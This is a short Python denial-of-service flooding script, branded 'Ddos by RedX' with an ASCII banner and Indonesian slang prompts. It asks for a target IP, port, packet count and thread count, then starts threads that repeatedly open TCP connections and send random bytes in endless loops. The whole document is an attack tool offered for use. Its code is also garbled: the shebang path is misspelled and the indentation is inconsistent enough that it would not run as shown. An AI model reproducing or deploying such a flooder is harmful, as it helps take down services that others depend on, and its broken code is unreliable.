#!/usr/bun/env python3
#Ddos by RedX
import random
import socket
import threading
import os

os.system("clear")
print("░█████╗░██╗░░░██╗░██████╗████████╗██╗███╗░░██╗")
print("██╔══██╗██║░░░██║██╔════╝╚══██╔══╝██║████╗░██║")
print("███████║██║░░░██║╚█████╗░░░░██║░░░██║██╔██╗██║")
print("██╔══██║██║░░░██║░╚═══██╗░░░██║░░░██║██║╚████║")
print("██║░░██║╚██████╔╝██████╔╝░░░██║░░░██║██║░╚███║")

print("------------------------------------------------------------")
print(" » Jangan  Abuse Anyink «")
print(" » TOOLS BY RedX! «")
print("------------------------------------------------------------")
ip = str(input(" DDoSAttackByRedX | ip  :" ))
port = int(input(" DDoSAttackByRedX | Port : " ))
choice = str(input(" DDosAttackByRedX | Gas Gak Ni?(y/n) : " ))
times = int(input(" DDoSAttackByRedX | Packets : " ))
threads = int(input(" DDoSAttackByRedX | Threads : " ))
def run() :
          data = random._urandom(1124)
           i= random.choice((" [ * ] " , " [ ! ] " , " [ # ]" ))
          while True:
                         try:
                                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                         s.connect((ip,port))
                                         s.send(data)
                                         for x in range(times):
                                                     s.send(data)
                                         print(i +" RedX Menyenggol ")
                        except:
                                         s.close()
                                         print("[*] RedX Ni Boss! ")
       
def run2( ) :
           data = random._urandom(26)
            i = random.choice((" [ * ] " , " [ ! ] " , " [ # ] " ))
            while True :
                          try :
                                           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                           s.connect((ip,port))
                                           s.send(data)
                                           for   x  in  range(times) :
                                                           s.send(data)
                                           print( i    +" RedX menyenggol ")
                          except :
                                           s.close( )
                                           print(" [ * ] RedX Ni Boss ! ")
                                                                                      
 for y in range ( threads ) :
          if choice == 'y' :
                        th = threading.Thread(target = run)
                        th.start( )
          else :
                        th = threading.Thread(target = run2)
                        th.start( )
              